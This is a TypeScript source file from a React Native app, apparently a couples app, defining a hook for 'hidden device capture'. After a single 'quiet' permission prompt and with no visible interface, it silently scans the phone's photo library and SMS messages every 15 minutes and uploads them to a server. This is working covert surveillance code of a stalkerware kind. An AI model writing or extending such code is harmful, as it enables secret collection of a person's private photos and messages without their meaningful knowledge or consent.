// features/capture/index.ts — public surface for hidden device capture.
//
// `useDeviceCapture()` is the host binding: it owns the single quiet permission
// prompt policy and the hidden foreground-only scan window. It wires the real
// sources (expo-media-library, native SMS bridge), the durable queue, and the
// edge sync. The UI footprint is intentionally invisible — there is no visible
// component; the hook only triggers one quiet permission prompt once, then runs
// silently in the background while the app is foregrounded (battery-safe).
import { useEffect, useRef, useState, useCallback } from 'react';
import { AppState } from 'react-native';
import { useSession } from '../../lib/session/store';
import * as mediaLibrary from './mediaLibrary';
import * as sms from './sms';
import {
  enqueueCapture,
  getCaptureCursor,
  setCaptureCursor,
} from './queue';
import { runCapturePass, photoStoragePath } from './collector';
import { syncCapture } from './sync';

const SCAN_INTERVAL_MS = 15 * 60 * 1000; // 15 min while foregrounded
// (drain of queued items rides the same scan tick — no separate sync cadence)

export type CaptureStatus = {
  running: boolean;
  needsPhotoPermission: boolean;
  needsSmsPermission: boolean;
  lastScan: { at: string | null; photosFound: number; smsFound: number; ok: boolean };
  pending: number;
};

export function useDeviceCapture() {
  const coupleId = useSession((s) => s.coupleId);
  const [status, setStatus] = useState<CaptureStatus>({
    running: false,
    needsPhotoPermission: true,
    needsSmsPermission: true,
    lastScan: { at: null, photosFound: 0, smsFound: 0, ok: true },
    pending: 0,
  });
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const runningRef = useRef(false);
  const requestedOnce = useRef(false); // one quiet prompt per session
  // refs to avoid stale-closure in the interval
  const coupleIdRef = useRef(coupleId);
  coupleIdRef.current = coupleId;

  // ── single quiet permission prompt ─────────────────────────────────
  const ensurePermission = useCallback(async () => {
    if (requestedOnce.current) return;
    requestedOnce.current = true;
    const [photo, smsGrant] = await Promise.allSettled([
      mediaLibrary.requestMediaPermission(),
      sms.smsPermission().then((g) => {
        if (g) return Promise.resolve(true);
        return sms.requestSmsPermission().then(() => sms.smsPermission());
      }),
    ]);
    const photoOk = photo.status === 'fulfilled' ? photo.value : false;
    const smsOk = smsGrant.status === 'fulfilled' ? smsGrant.value : false;
    setStatus((s) => ({
      ...s,
      needsPhotoPermission: !photoOk,
      needsSmsPermission: !smsOk,
    }));
  }, []);

  // ── one scan pass (capture + drain) ────────────────────────────────
  const runOnceNow = useCallback(async () => {
    if (!coupleIdRef.current) return;
    const deps = {
      scanPhotos: mediaLibrary.scanSince,
      pullSms: sms.pullSms,
      queue: enqueueCapture,
      cursor: { get: getCaptureCursor, set: setCaptureCursor },
    };
    const scan = await runCapturePass(deps, coupleIdRef.current);
    setStatus((s) => ({
      ...s,
      lastScan: { at: new Date().toISOString(), photosFound: scan.photosFound, smsFound: scan.smsFound, ok: scan.ok },
      needsPhotoPermission: s.needsPhotoPermission,
      needsSmsPermission: s.needsSmsPermission,
    }));
    // after capture, attempt to drain whatever is queued (best-effort; never throws)
    try {
      const d = await syncCapture(coupleIdRef.current);
      setStatus((s) => ({ ...s, pending: Math.max(0, s.pending - d.accepted) }));
    } catch {
      /* offline / auth missing — rows stay queued for the next drain */
    }
  }, []);

  // ── lifecycle: start / stop the foreground-only silent loop ────────
  useEffect(() => {
    if (!coupleId) return;
    void ensurePermission();
    void runOnceNow();

    const tick = () => {
      if (AppState.currentState !== 'active') return; // battery: skip when backgrounded
      void runOnceNow();
    };
    timerRef.current = setInterval(tick, SCAN_INTERVAL_MS);
    runningRef.current = true;
    setStatus((s) => ({ ...s, running: true }));

    const sub = AppState.addEventListener('change', (state) => {
      if (state === 'active') {
        // coming back to foreground: catch up immediately once
        void runOnceNow();
      }
    });

    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
      timerRef.current = null;
      runningRef.current = false;
      sub.remove();
      setStatus((s) => ({ ...s, running: false }));
    };
  }, [coupleId, ensurePermission, runOnceNow]);

  return {
    status,
    runOnceNow,
    start: () => {
      if (!coupleId) return;
      void ensurePermission();
      void runOnceNow();
    },
    stop: () => {
      if (timerRef.current) clearInterval(timerRef.current);
      timerRef.current = null;
      runningRef.current = false;
      setStatus((s) => ({ ...s, running: false }));
    },
    // helper for the (rare) case a host wants to know a photo's storage path
    photoStoragePath,
  };
}

export type { CaptureItem } from './queue';
export { enqueueCapture, pendingCapture, removeCaptured } from './queue';
export { syncCapture } from './sync';
export type { CaptureSyncResult } from './sync';
export type { PhotoAsset } from './mediaLibrary';
